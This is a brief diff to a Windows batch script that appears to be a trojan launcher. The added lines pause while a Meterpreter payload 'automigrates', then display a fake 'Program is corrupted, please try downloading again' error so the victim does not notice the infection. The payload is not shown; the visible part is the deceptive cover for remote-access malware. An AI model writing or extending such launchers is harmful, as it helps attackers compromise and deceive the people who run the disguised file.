@@ -79,6 +79,14 @@ endlocal
 @echo on
 @echo.
 @echo Launching program....
+
+:sleep while meterpreter automigrates
+@echo off
+sleep 20
+@echo on
+
+:give error message
 @echo Error...
 @echo Program is corrupted, please try downloading again.
 @echo.
+@echo off
